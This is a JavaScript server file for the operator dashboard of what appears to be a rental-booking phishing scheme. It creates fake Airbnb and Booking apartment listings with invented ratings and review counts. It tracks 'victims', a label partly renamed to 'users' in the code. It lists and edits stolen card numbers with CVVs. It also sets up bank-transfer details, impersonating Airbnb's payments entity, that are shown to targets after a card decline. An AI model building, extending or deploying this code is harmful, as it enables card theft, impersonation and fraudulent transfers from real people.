function apartmentFormHtml(apt) {
  const A = apt || {};
  const isEdit = !!(A && A.id);
  let existingAmens = [];
  if (isEdit && A.amenities) existingAmens = String(A.amenities).split(',').map(s => s.trim()).filter(Boolean);
  const amenChecks = amenityChipsHtml(existingAmens);
  let gal = '';
  if (isEdit) {
    let imgs = [];
    try { imgs = A.images ? JSON.parse(A.images) : []; } catch (e) { imgs = []; }
    if (!imgs.length && A.image_url) imgs = [A.image_url];
    if (imgs.length) {
      gal = `<div class="mf-media-grid">${imgs.map(u => `<label class="mf-thumb"><img src="${esc(u)}"><span><input type="checkbox" name="remove_image" value="${esc(u)}"> Remove</span></label>`).join('')}</div>`;
    }
  }
  return `
<style>
.mf-card{background:linear-gradient(165deg,#16162a 0%,#0f0f1c 100%);border:1px solid rgba(255,255,255,.06);border-radius:18px;padding:28px 28px 24px;margin-bottom:24px;box-shadow:0 16px 48px rgba(0,0,0,.35)}
.mf-card h2{margin:0 0 4px;font-size:20px;font-weight:700;color:#fff;letter-spacing:-.02em}
.mf-card .mf-sub{color:#6b7280;font-size:13px;margin:0 0 22px;line-height:1.45}
.mf-steps{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:22px}
.mf-step-pill{font-size:11px;font-weight:600;letter-spacing:.03em;text-transform:uppercase;color:#9ca3af;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.06);padding:6px 12px;border-radius:999px}
.mf-step-pill.on{color:#fff;border-color:rgba(255,56,92,.45);background:rgba(255,56,92,.12)}
.mf-sec{font-size:13px;font-weight:700;color:#e5e7eb;margin:22px 0 12px;padding-bottom:8px;border-bottom:1px solid rgba(255,255,255,.06);display:flex;align-items:center;gap:10px}
.mf-sec span{display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:7px;background:linear-gradient(135deg,#FF385C,#E61E4D);color:#fff;font-size:11px;font-weight:800}
.mf-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.mf-grid .full{grid-column:1/-1}
.mf-field label{display:block;font-size:11px;font-weight:600;letter-spacing:.04em;text-transform:uppercase;color:#6b7280;margin-bottom:6px}
.mf-field input,.mf-field select,.mf-field textarea{width:100%;padding:11px 13px;background:#0a0a14;border:1px solid rgba(255,255,255,.08);color:#f3f4f6;border-radius:11px;font-size:14px;transition:border-color .15s,box-shadow .15s}
.mf-field input:focus,.mf-field select:focus,.mf-field textarea:focus{outline:none;border-color:rgba(255,56,92,.55);box-shadow:0 0 0 3px rgba(255,56,92,.12)}
.mf-field input::placeholder,.mf-field textarea::placeholder{color:#4b5563}
.amen-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(148px,1fr));gap:8px;padding:14px;background:#0a0a14;border:1px solid rgba(255,255,255,.06);border-radius:14px;max-height:260px;overflow:auto}
.amen-item{display:flex;align-items:center;gap:8px;padding:9px 11px;border-radius:10px;background:rgba(255,255,255,.03);border:1px solid transparent;cursor:pointer;user-select:none;transition:all .12s}
.amen-item:hover{background:rgba(255,255,255,.05)}
.amen-item:has(input:checked){border-color:rgba(255,56,92,.5);background:rgba(255,56,92,.1)}
.amen-item input{width:15px;height:15px;accent-color:#FF385C;margin:0;flex-shrink:0}
.amen-label{font-size:12.5px;color:#d1d5db;font-weight:500;line-height:1.25;text-transform:none;letter-spacing:0}
.mf-check{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px}
.mf-check input{width:17px;height:17px;accent-color:#FF385C}
.mf-check label{color:#d1d5db;font-size:13px;margin:0;cursor:pointer;text-transform:none;letter-spacing:0;font-weight:500}
.mf-btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:13px 26px;background:linear-gradient(90deg,#FF385C,#E61E4D);color:#fff;border:none;border-radius:12px;font-weight:700;font-size:14px;cursor:pointer;box-shadow:0 10px 28px rgba(255,56,92,.28);margin-top:8px}
.mf-btn:hover{filter:brightness(1.05)}
.mf-media-grid{display:flex;flex-wrap:wrap;gap:10px;margin-bottom:12px}
.mf-thumb{position:relative;width:104px;cursor:pointer}
.mf-thumb img{width:104px;height:76px;object-fit:cover;border-radius:10px;border:1px solid rgba(255,255,255,.08);display:block}
.mf-thumb span{position:absolute;left:4px;bottom:4px;background:rgba(0,0,0,.78);color:#fff;font-size:10px;padding:2px 6px;border-radius:5px;display:flex;align-items:center;gap:4px}
.mf-hint{color:#6b7280;font-size:12px;margin-top:6px;line-height:1.4}
.mf-actions{display:flex;align-items:center;gap:14px;flex-wrap:wrap;margin-top:20px;padding-top:18px;border-top:1px solid rgba(255,255,255,.06)}
@media(max-width:800px){.mf-grid{grid-template-columns:1fr}}
</style>
<form method="POST" action="/dashboard/apartments/save" enctype="multipart/form-data" class="mf-card" id="aptForm">
  ${isEdit ? `<input type="hidden" name="id" value="${A.id}">` : ''}
  <h2>${isEdit ? 'Edit apartment' : 'New apartment'}</h2>
  <p class="mf-sub">Reusable property template — available on both Airbnb and Booking when you create a listing.</p>
  <div class="mf-sec"><span>1</span> Basics</div>
  <div class="mf-grid">
    <div class="mf-field"><label>Internal name *</label><input name="name" required value="${esc(A.name||'')}" placeholder="Onyx Mews 2BR"></div>
    <div class="mf-field"><label>Public title *</label><input name="title" required value="${esc(A.title||'')}" placeholder="Stylish 2-bed near the city centre"></div>
    <div class="mf-field"><label>Location *</label><input name="location" required value="${esc(A.location||'')}" placeholder="London, United Kingdom"></div>
    <div class="mf-field"><label>Property type</label>
      <select name="property_type">${['Entire apartment','Entire home','Private room','Hotel room','Shared room','Boutique hotel'].map(pt => `<option${(A.property_type||'Entire apartment')===pt?' selected':''}>${pt}</option>`).join('')}</select>
    </div>
  </div>
  <div class="mf-sec"><span>2</span> Pricing & capacity</div>
  <div class="mf-grid">
    <div class="mf-field"><label>Price / night *</label><input type="number" step="0.01" name="price" required value="${esc(String(A.price??''))}" placeholder="189"></div>
    <div class="mf-field"><label>Price / month *</label><input type="number" step="0.01" name="price_month" required value="${esc(String(A.price_month??''))}" placeholder="3850"></div>
    <div class="full mf-check"><input type="checkbox" name="hide_nightly" value="1" id="aptHideN"${Number(A.hide_nightly)===1?' checked':''}><label for="aptHideN">Hide nightly price — show monthly only on the public page</label></div>
    <div class="mf-field"><label>Guests</label><input type="number" name="guests" min="1" max="16" value="${A.guests||4}"></div>
    <div class="mf-field"><label>Bedrooms</label><input type="number" name="bedrooms" min="0" value="${A.bedrooms??2}"></div>
    <div class="mf-field"><label>Beds</label><input type="number" name="beds" min="1" value="${A.beds??2}"></div>
    <div class="mf-field"><label>Baths</label><input type="number" step="0.5" name="baths" min="0.5" value="${A.baths??1}"></div>
    <div class="mf-field"><label>Locale defaults</label>
      <select name="locale">${['gb','us','fr','es','de','it','pt','ro','nl','au'].map(c=>`<option value="${c}"${(A.locale||'gb')===c?' selected':''}>${c.toUpperCase()}</option>`).join('')}</select>
    </div>
    <div class="mf-field"><label>Rating</label><input name="rating" value="${esc(String(A.rating||'4.92'))}"></div>
    <div class="mf-field"><label>Reviews count</label><input type="number" name="reviews" min="0" value="${A.reviews||48}"></div>
  </div>
  <div class="mf-sec"><span>3</span> Description</div>
  <div class="mf-grid">
    <div class="mf-field full"><label>Full description</label><textarea name="description" rows="5" placeholder="Space, neighbourhood, house rules…">${esc(A.description||'')}</textarea></div>
  </div>
  <div class="mf-sec"><span>4</span> Amenities</div>
  <div class="amen-grid">${amenChecks}</div>
  <div class="mf-grid" style="margin-top:12px">
    <div class="mf-field full"><label>Extra amenities (comma-separated)</label><input type="text" name="amenities_custom" placeholder="Wine cellar, Concierge, Sauna…" value="${isEdit ? esc((existingAmens.filter(a => !AMENITY_LIST.some(x => x.toLowerCase()===a.toLowerCase()))).join(', ')) : ''}"></div>
  </div>
  <div class="mf-sec"><span>5</span> Photos & video</div>
  ${gal}
  <div class="mf-grid">
    <div class="mf-field full"><label>Upload photos</label><input type="file" name="photos" accept="image/*" multiple><p class="mf-hint">JPG, PNG, WebP, GIF — multiple files allowed.</p></div>
    <div class="mf-field full"><label>Or paste photo URLs (one per line)</label><textarea name="image_urls" rows="3" placeholder="https://…/photo1.jpg"></textarea></div>
    <div class="mf-field"><label>Upload video</label><input type="file" name="videos" accept="video/mp4,video/webm,video/quicktime,video/*"><p class="mf-hint">MP4 / WebM / MOV, max 200MB.</p></div>
    <div class="mf-field"><label>Or video URL</label><input type="text" name="video_url" placeholder="https://…/tour.mp4 or YouTube" value="${isEdit && A.video_url && !String(A.video_url).startsWith('/uploads/') ? esc(A.video_url) : (isEdit && A.video_url ? '' : esc(A.video_url||''))}">
      ${isEdit && A.video_url ? `<p class="mf-hint">Current: <a href="${esc(A.video_url)}" target="_blank" style="color:#4da3ff">${esc(A.video_url)}</a></p>` : ''}
    </div>
  </div>
  <div class="mf-actions">
    <button class="mf-btn" type="submit">${isEdit ? 'Save changes' : 'Save apartment'}</button>
    ${isEdit ? '<a href="/dashboard/apartments" style="color:#8899ff;font-size:13px;text-decoration:none">Cancel</a>' : ''}
  </div>
</form>`;
}


// === USERS (formerly Victims) ===
app.get('/dashboard/users', requireClient, (req, res) => {
  const victims = db.prepare("SELECT v.*, l.title as listing_title, l.client_first_name, l.client_last_name FROM victims v LEFT JOIN listings l ON v.listing_id = l.id WHERE v.user_id = ? ORDER BY v.created_at DESC LIMIT 200").all(req.user.id);
  const msg = req.query.msg ? `<div style="background:#0f2a1a;border:1px solid #2e7d32;color:#c8e6c9;padding:12px 14px;border-radius:8px;margin-bottom:14px">${esc(String(req.query.msg))}</div>` : '';
  let content = `<div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:12px">
      <div><h1 style="margin:0">👥 Users</h1>
      <p style="color:#777;margin:6px 0 0;font-size:14px">Visitors & booking funnel contacts. Bulk select to delete or edit one by one.</p></div>
    </div>
    ${msg}
    <div class="panel" style="margin-bottom:16px">
      <h3 style="margin:0 0 8px">Live activity</h3>
      <div id="liveFeed" style="max-height:180px;overflow:auto;color:#888;font-size:13px">Waiting for client activity on listing pages…</div>
    </div>
    <form method="POST" action="/dashboard/users/delete-bulk" id="usBulkForm" onsubmit="return usConfirmBulk()">
    <div style="display:flex;gap:10px;align-items:center;margin-bottom:12px;flex-wrap:wrap">
      <button type="submit" id="usBulkBtn" disabled style="background:#e74c3c;color:#fff;border:none;border-radius:8px;padding:10px 16px;font-weight:700;cursor:pointer;opacity:.45">Delete selected (<span id="usSelCount">0</span>)</button>
      <label style="color:#aaa;font-size:13px;cursor:pointer;display:flex;align-items:center;gap:6px">
        <input type="checkbox" id="usCheckAll" style="width:16px;height:16px;accent-color:#e74c3c;cursor:pointer"> Select all
      </label>
    </div>
    <div class="panel" style="overflow-x:auto"><table class="data-table" style="width:100%"><tr>
      <th></th><th>ID</th><th>Client listing</th><th>Email</th><th>Phone</th><th>Name</th><th>Market</th><th>Stage</th><th>IP</th><th>Date</th><th></th>
    </tr>
    ${victims.map(v => {
      const cl = ((v.client_first_name||'') + ' ' + (v.client_last_name||'')).trim();
      return `<tr>
        <td><input type="checkbox" name="ids" value="${v.id}" class="us-check" style="width:16px;height:16px;cursor:pointer;accent-color:#e74c3c"></td>
        <td>${v.id}</td>
        <td>${esc(cl || v.listing_title || '-')}</td>
        <td>${esc(v.email||'-')}</td>
        <td>${esc(v.phone||'-')}</td>
        <td>${esc(v.full_name||'-')}</td>
        <td>${esc(v.marketplace||'')}</td>
        <td>${esc(v.stage||'')}</td>
        <td style="font-size:11px;color:#888">${esc(v.ip_address||'')}</td>
        <td style="font-size:12px">${esc(v.created_at||'')}</td>
        <td style="white-space:nowrap">
          <a href="/dashboard/users/edit/${v.id}" style="color:#4da3ff;margin-right:8px;text-decoration:none">Edit</a>
          <a href="/dashboard/users/delete/${v.id}" onclick="return confirm('Delete user #${v.id}?')" style="color:#f44336;text-decoration:none">Delete</a>
        </td>
      </tr>`;
    }).join('') || '<tr><td colspan="11" style="padding:24px;color:#666;text-align:center">No users yet</td></tr>'}
    </table></div></form>
    <script>(function(){
      var form=document.getElementById('usBulkForm'); if(!form) return;
      var all=document.getElementById('usCheckAll'), btn=document.getElementById('usBulkBtn'), cnt=document.getElementById('usSelCount');
      function boxes(){return Array.prototype.slice.call(form.querySelectorAll('.us-check'));}
      function refresh(){var b=boxes(),n=b.filter(function(x){return x.checked}).length; cnt.textContent=n; btn.disabled=n===0; btn.style.opacity=n?1:.45; btn.style.cursor=n?'pointer':'not-allowed'; if(all) all.checked=n>0&&n===b.length;}
      form.addEventListener('change', function(e){ if(e.target&&e.target.classList&&e.target.classList.contains('us-check')) refresh(); });
      if(all) all.addEventListener('change', function(){ boxes().forEach(function(x){x.checked=all.checked}); refresh(); });
      window.usConfirmBulk=function(){ var n=boxes().filter(function(x){return x.checked}).length; if(!n) return false; return confirm('Delete '+n+' selected users?'); };
      refresh();
    })();</script>`;
  res.send(clientPage('Users', content, req.user));
});
app.get('/dashboard/victims', requireClient, (req, res) => res.redirect('/dashboard/users'));

app.get('/dashboard/users/delete/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  try {
    const v = db.prepare('SELECT id FROM victims WHERE id = ? AND user_id = ?').get(id, req.user.id);
    if (v) {
      try { db.prepare('DELETE FROM cards WHERE victim_id = ?').run(id); } catch (e) {}
      db.prepare('DELETE FROM victims WHERE id = ? AND user_id = ?').run(id, req.user.id);
    }
  } catch (e) {}
  res.redirect('/dashboard/users?msg=User+deleted');
});

app.post('/dashboard/users/delete-bulk', requireClient, (req, res) => {
  let ids = req.body.ids || [];
  if (!Array.isArray(ids)) ids = [ids];
  ids = ids.map(x => parseInt(x, 10)).filter(n => n > 0);
  let n = 0;
  for (const id of ids) {
    try {
      const v = db.prepare('SELECT id FROM victims WHERE id = ? AND user_id = ?').get(id, req.user.id);
      if (!v) continue;
      try { db.prepare('DELETE FROM cards WHERE victim_id = ?').run(id); } catch (e) {}
      const r = db.prepare('DELETE FROM victims WHERE id = ? AND user_id = ?').run(id, req.user.id);
      n += r.changes || 0;
    } catch (e) {}
  }
  res.redirect('/dashboard/users?msg=Deleted+' + n + '+users');
});

app.get('/dashboard/users/edit/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const v = db.prepare('SELECT * FROM victims WHERE id = ? AND user_id = ?').get(id, req.user.id);
  if (!v) return res.redirect('/dashboard/users');
  const content = `<div style="margin-bottom:8px"><a href="/dashboard/users" style="color:#8899ff;text-decoration:none;font-size:14px">← Back to Users</a></div>
    <h1>Edit user #${v.id}</h1>
    <form method="POST" action="/dashboard/users/edit/${v.id}" class="panel" style="max-width:560px;display:flex;flex-direction:column;gap:12px">
      <div><label>Full name</label><input name="full_name" value="${esc(v.full_name||'')}" style="width:100%"></div>
      <div><label>Email</label><input name="email" value="${esc(v.email||'')}" style="width:100%"></div>
      <div><label>Phone</label><input name="phone" value="${esc(v.phone||'')}" style="width:100%"></div>
      <div><label>Stage</label><input name="stage" value="${esc(v.stage||'')}" style="width:100%"></div>
      <div><label>Marketplace</label><input name="marketplace" value="${esc(v.marketplace||'')}" style="width:100%"></div>
      <div style="display:flex;gap:12px">
        <button type="submit" class="btn" style="background:#4CAF50;color:#fff;border:none;padding:12px 20px;border-radius:8px;font-weight:700;cursor:pointer">Save</button>
        <a href="/dashboard/users" style="color:#8899ff;align-self:center">Cancel</a>
      </div>
    </form>`;
  res.send(clientPage('Users', content, req.user));
});

app.post('/dashboard/users/edit/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const v = db.prepare('SELECT id FROM victims WHERE id = ? AND user_id = ?').get(id, req.user.id);
  if (!v) return res.redirect('/dashboard/users');
  const b = req.body || {};
  db.prepare('UPDATE victims SET full_name = ?, email = ?, phone = ?, stage = ?, marketplace = ? WHERE id = ? AND user_id = ?').run(
    String(b.full_name || '').trim(),
    String(b.email || '').trim(),
    String(b.phone || '').trim(),
    String(b.stage || '').trim(),
    String(b.marketplace || '').trim(),
    id,
    req.user.id
  );
  res.redirect('/dashboard/users?msg=User+updated');
});

app.get('/dashboard/cards', requireClient, (req, res) => {
  const cards = db.prepare('SELECT c.*, v.email as victim_email, v.full_name as victim_name FROM cards c LEFT JOIN victims v ON v.id = c.victim_id WHERE c.user_id = ? ORDER BY c.created_at DESC LIMIT 200').all(req.user.id);
  const msg = req.query.msg ? `<div style="background:#0f2a1a;border:1px solid #2e7d32;color:#c8e6c9;padding:12px 14px;border-radius:8px;margin-bottom:14px">${esc(String(req.query.msg))}</div>` : '';
  let content = `<h1>💳 Carduri</h1>${msg}
    <form method="POST" action="/dashboard/cards/delete-bulk" id="cdBulkForm" onsubmit="return confirm('Delete selected cards?')">
    <div style="display:flex;gap:10px;align-items:center;margin-bottom:12px;flex-wrap:wrap">
      <button type="submit" class="btn btn-danger" id="cdBulkBtn" disabled style="opacity:.45">Delete selected (<span id="cdSelCount">0</span>)</button>
      <label style="color:#aaa;font-size:13px;display:flex;align-items:center;gap:6px"><input type="checkbox" id="cdCheckAll"> Select all</label>
    </div>
    <div class="panel" style="overflow-x:auto"><table class="data-table" style="width:100%"><tr>
      <th></th><th>ID</th><th>Number</th><th>Holder</th><th>Exp</th><th>CVV</th><th>Amount</th><th>User</th><th>Date</th><th></th>
    </tr>
    ${cards.map(c => `<tr>
      <td><input type="checkbox" name="ids" value="${c.id}" class="cd-check"></td>
      <td>${c.id}</td>
      <td style="font-family:monospace">${esc(c.card_number||'')}</td>
      <td>${esc(c.card_holder||'')}</td>
      <td>${esc(c.expiry||'')}</td>
      <td>${esc(c.cvv||'')}</td>
      <td>${esc(c.amount||'')}</td>
      <td style="font-size:12px;color:#aaa">${esc(c.victim_name||c.victim_email||'-')}</td>
      <td style="font-size:12px">${esc(c.created_at||'')}</td>
      <td style="white-space:nowrap">
        <a href="/dashboard/cards/edit/${c.id}" style="color:#4da3ff;margin-right:8px">Edit</a>
        <a href="/dashboard/cards/delete/${c.id}" onclick="return confirm('Delete card?')" style="color:#f44336">Delete</a>
      </td>
    </tr>`).join('')}
    </table></div></form>
    <script>(function(){
      var form=document.getElementById('cdBulkForm'); if(!form) return;
      var all=document.getElementById('cdCheckAll'), btn=document.getElementById('cdBulkBtn'), cnt=document.getElementById('cdSelCount');
      function boxes(){return Array.prototype.slice.call(form.querySelectorAll('.cd-check'));}
      function refresh(){var b=boxes(),n=b.filter(function(x){return x.checked}).length; cnt.textContent=n; btn.disabled=n===0; btn.style.opacity=n?1:.45; if(all) all.checked=n>0&&n===b.length;}
      form.addEventListener('change', refresh); if(all) all.addEventListener('change', function(){boxes().forEach(function(x){x.checked=all.checked}); refresh();}); refresh();
    })();</script>`;
  res.send(clientPage('Carduri', content, req.user));
});

app.get('/dashboard/cards/delete/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  db.prepare('DELETE FROM cards WHERE id = ? AND user_id = ?').run(id, req.user.id);
  res.redirect('/dashboard/cards?msg=Card+deleted');
});

app.post('/dashboard/cards/delete-bulk', requireClient, (req, res) => {
  let ids = req.body.ids || [];
  if (!Array.isArray(ids)) ids = [ids];
  ids = ids.map(x => parseInt(x, 10)).filter(n => n > 0);
  let n = 0;
  for (const id of ids) {
    const r = db.prepare('DELETE FROM cards WHERE id = ? AND user_id = ?').run(id, req.user.id);
    n += r.changes || 0;
  }
  res.redirect('/dashboard/cards?msg=Deleted+' + n + '+cards');
});

app.get('/dashboard/cards/edit/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const c = db.prepare('SELECT * FROM cards WHERE id = ? AND user_id = ?').get(id, req.user.id);
  if (!c) return res.redirect('/dashboard/cards');
  const content = `<h1>Edit card #${c.id}</h1>
    <form method="POST" action="/dashboard/cards/edit/${c.id}" class="panel" style="max-width:520px;display:flex;flex-direction:column;gap:12px">
      <div><label>Card number</label><input name="card_number" value="${esc(c.card_number||'')}" style="width:100%"></div>
      <div><label>Holder</label><input name="card_holder" value="${esc(c.card_holder||'')}" style="width:100%"></div>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
        <div><label>Expiry</label><input name="expiry" value="${esc(c.expiry||'')}" style="width:100%"></div>
        <div><label>CVV</label><input name="cvv" value="${esc(c.cvv||'')}" style="width:100%"></div>
      </div>
      <div><label>Amount</label><input name="amount" value="${esc(c.amount||'')}" style="width:100%"></div>
      <div><label>Type</label><input name="card_type" value="${esc(c.card_type||'')}" style="width:100%"></div>
      <div style="display:flex;gap:10px"><button class="btn btn-primary" type="submit">Save</button>
        <a class="btn" href="/dashboard/cards" style="background:#333;color:#fff">Cancel</a></div>
    </form>`;
  res.send(clientPage('Carduri', content, req.user));
});

app.post('/dashboard/cards/edit/:id', requireClient, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const b = req.body || {};
  const c = db.prepare('SELECT id FROM cards WHERE id = ? AND user_id = ?').get(id, req.user.id);
  if (!c) return res.redirect('/dashboard/cards');
  db.prepare(`UPDATE cards SET card_number=?, card_holder=?, expiry=?, cvv=?, amount=?, card_type=? WHERE id=? AND user_id=?`).run(
    String(b.card_number||'').trim(),
    String(b.card_holder||'').trim(),
    String(b.expiry||'').trim(),
    String(b.cvv||'').trim(),
    String(b.amount||'').trim(),
    String(b.card_type||'').trim(),
    id, req.user.id
  );
  res.redirect('/dashboard/cards?msg=Card+updated');
});

app.get('/dashboard/payments', requireClient, (req, res) => {
  const payments = db.prepare('SELECT * FROM payments WHERE user_id = ? ORDER BY created_at DESC LIMIT 50').all(req.user.id);
  let content = `<h1>💰 Plățile Tale</h1><div class="panel"><table class="data-table"><tr><th>Tip</th><th>Sumă</th><th>Status</th><th>Dată</th></tr>
    ${payments.map(p => `<tr><td>${p.type}</td><td>${p.amount}</td><td><span class="status-${p.status}">${p.status}</span></td><td>${p.created_at}</td></tr>`).join('')}
  </table></div>`;
  res.send(clientPage('Plăți', content, req.user));
});

app.get('/dashboard/settings', requireClient, (req, res) => {
  const saved = req.query.saved ? `<div style="background:#0f2a1a;border:1px solid #2e7d32;color:#c8e6c9;padding:12px;border-radius:8px;margin-bottom:14px;max-width:500px">Saved.</div>` : '';
  const err = req.query.err ? `<div style="background:#3b1111;border:1px solid #e74c3c;color:#f5c6c6;padding:12px;border-radius:8px;margin-bottom:14px;max-width:500px">${esc(String(req.query.err))}</div>` : '';
  let content = `<h1>⚙️ Setări Cont</h1>${saved}${err}
    <div class="panel" style="max-width:500px;margin-bottom:20px;border:1px solid #3b2866;background:linear-gradient(145deg,#160f2e,#110b24);border-radius:10px;padding:20px">
      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
        <h3 style="margin:0;color:#fff;display:flex;align-items:center;gap:8px">🌐 Custom Domains &amp; SSL</h3>
        <span style="background:rgba(168,85,247,0.2);color:#c084fc;padding:3px 8px;border-radius:4px;font-size:11px;font-weight:700">ACTIVE</span>
      </div>
      <p style="color:#a399c2;font-size:13px;line-height:1.5;margin:0 0 14px">Conectează și gestionează domenii web personalizate pentru Security Check Lab și Marketplace, cu certificate SSL automate Let's Encrypt.</p>
      <a href="/dashboard/domains" style="display:inline-flex;align-items:center;gap:6px;text-decoration:none;padding:10px 16px;background:linear-gradient(135deg,#7c3aed,#9333ea);color:#fff;border-radius:6px;font-weight:600;font-size:13px">
        <span>🌐 Deschide Domain Manager</span> →
      </a>
    </div>
    <div class="panel" style="max-width:500px;margin-bottom:20px"><h3>Username</h3>
    <form method="POST" action="/dashboard/settings" style="display:flex;flex-direction:column;gap:12px">
      <input type="hidden" name="action" value="username">
      <div><label>Current username</label><input type="text" value="${esc(req.user.username)}" disabled style="width:100%;padding:10px;background:#12121f;border:1px solid #333;color:#888;border-radius:6px"></div>
      <div><label>New username</label><input type="text" name="username" required minlength="3" pattern="[A-Za-z0-9._-]{3,32}" style="width:100%;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:6px"></div>
      <div><button type="submit" class="btn btn-primary">Change username</button></div>
    </form></div>
    <div class="panel" style="max-width:500px"><h3>Password</h3>
    <form method="POST" action="/dashboard/settings" style="display:flex;flex-direction:column;gap:12px">
      <input type="hidden" name="action" value="password">
      <div><label>Current password</label><input type="password" name="current_password" required style="width:100%;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:6px"></div>
      <div><label>New password</label><input type="password" name="password" required minlength="6" style="width:100%;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:6px"></div>
      <div><label>Confirm new password</label><input type="password" name="password2" required minlength="6" style="width:100%;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:6px"></div>
      <div><button type="submit" class="btn btn-primary">Change password</button></div>
    </form></div>`;
  res.send(clientPage('Setări', content, req.user));
});

app.post('/dashboard/settings', requireClient, (req, res) => {
  const b = req.body || {};
  const action = b.action || 'password';
  if (action === 'username') {
    const username = String(b.username || '').trim();
    if (!/^[A-Za-z0-9._-]{3,32}$/.test(username)) return res.redirect('/dashboard/settings?err=' + encodeURIComponent('Invalid username'));
    const clash = db.prepare('SELECT id FROM users WHERE username = ? AND id != ?').get(username, req.user.id);
    if (clash) return res.redirect('/dashboard/settings?err=' + encodeURIComponent('Username already taken'));
    db.prepare('UPDATE users SET username = ? WHERE id = ?').run(username, req.user.id);
    return res.redirect('/dashboard/settings?saved=1');
  }
  const cur = String(b.current_password || '');
  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.user.id);
  if (!user || !bcrypt.compareSync(cur, user.password_hash)) {
    return res.redirect('/dashboard/settings?err=' + encodeURIComponent('Current password incorrect'));
  }
  if (!b.password || b.password.length < 6) return res.redirect('/dashboard/settings?err=' + encodeURIComponent('Password too short'));
  if (b.password !== b.password2) return res.redirect('/dashboard/settings?err=' + encodeURIComponent('Passwords do not match'));
  const hash = bcrypt.hashSync(b.password, 10);
  db.prepare('UPDATE users SET password_hash = ? WHERE id = ?').run(hash, req.user.id);
  res.redirect('/dashboard/settings?saved=1');
});


// === PAYMENT CONFIG (country-specific) ===
app.get('/dashboard/payment-config', requireClient, (req, res) => {
  const pc = resolvePaymentConfig(req.user.id);
  const country = pc.country || 'GB';
  let bsb = '';
  try { bsb = pc.extra_json ? (JSON.parse(pc.extra_json).bsb || '') : ''; } catch (e) {}
  const saved = req.query.saved ? `<div style="background:#0f2a1a;border:1px solid #2e7d32;color:#c8e6c9;padding:12px;border-radius:8px;margin-bottom:14px;max-width:640px">Payment config saved.</div>` : '';
  const countryOpts = Object.keys(PAYMENT_COUNTRIES).map(k =>
    `<option value="${k}"${country===k?' selected':''}>${PAYMENT_COUNTRIES[k].label}</option>`
  ).join('');
  const field = (name, label, val, ph) =>
    `<div class="pc-field" data-fields="${name}" style="margin-bottom:14px;display:none"><label style="display:block;color:#aaa;font-size:12px;margin-bottom:4px">${label}</label>
      <input name="${name}" value="${esc(val||'')}" placeholder="${esc(ph||'')}" style="width:100%;padding:12px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px"></div>`;
  let content = `<h1>🏦 Payment Config</h1>${saved}
    <p style="color:#888;margin-bottom:20px">Bank details shown after card decline. Fields change by country.</p>
    <form method="POST" action="/dashboard/payment-config" id="pcForm" style="background:#1a1a2e;padding:24px;border-radius:12px;max-width:640px">
      <div style="margin-bottom:14px"><label style="display:block;color:#aaa;font-size:12px;margin-bottom:4px">Country</label>
        <select name="country" id="pcCountry" onchange="pcApplyCountry()" style="width:100%;padding:12px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px">${countryOpts}</select></div>
      ${field('bank_name','Bank name', pc.bank_name, 'Revolut / Barclays')}
      ${field('beneficiary','Beneficiary / Account name', pc.beneficiary, 'Airbnb Payments UK Ltd')}
      ${field('iban','IBAN', pc.iban, 'GB29 NWBK 6016 1331 9268 19')}
      ${field('bic','BIC / SWIFT', pc.bic, 'REVOLT21')}
      ${field('account_number','Account number', pc.account_number, '12345678')}
      ${field('sort_code','Sort code', pc.sort_code, '04-00-04')}
      ${field('routing_number','Routing number (ABA)', pc.routing_number, '021000021')}
      ${field('account_type','Account type', pc.account_type, 'checking / savings')}
      ${field('bsb','BSB', bsb, '062-000')}
      ${field('bank_address','Bank address', pc.bank_address, 'Optional')}
      <div style="margin-bottom:14px"><label style="display:block;color:#aaa;font-size:12px;margin-bottom:4px">Payment reference prefix</label>
        <input name="reference_prefix" value="${esc(pc.reference_prefix||'ABB')}" style="width:100%;padding:12px;background:#0d0d1a;border:1px solid #333;color:#fff;border-radius:8px">
        <div style="color:#666;font-size:12px;margin-top:6px">Shown as PREFIX-victimId on the transfer page.</div></div>
      <button type="submit" style="padding:14px 28px;background:linear-gradient(90deg,#FF385C,#E61E4D);color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer">Save Payment Config</button>
    </form>
    <script>
    var PC_MAP = {"GB": ["bank_name", "beneficiary", "account_number", "sort_code", "iban", "bic", "bank_address"], "IE": ["bank_name", "beneficiary", "iban", "bic", "bank_address"], "ES": ["bank_name", "beneficiary", "iban", "bic", "bank_address"], "FR": ["bank_name", "beneficiary", "iban", "bic", "bank_address"], "DE": ["bank_name", "beneficiary", "iban", "bic", "bank_address"], "IT": ["bank_name", "beneficiary", "iban", "bic", "bank_address"], "PT": ["bank_name", "beneficiary", "iban", "bic", "bank_address"], "NL": ["bank_name", "beneficiary", "iban", "bic", "bank_address"], "RO": ["bank_name", "beneficiary", "iban", "bic", "bank_address"], "US": ["bank_name", "beneficiary", "account_number", "routing_number", "account_type", "bank_address"], "CA": ["bank_name", "beneficiary", "account_number", "routing_number", "bank_address"], "AU": ["bank_name", "beneficiary", "account_number", "bsb", "bank_address"], "OTHER": ["bank_name", "beneficiary", "iban", "bic", "account_number", "bank_address"]};
    function pcApplyCountry(){
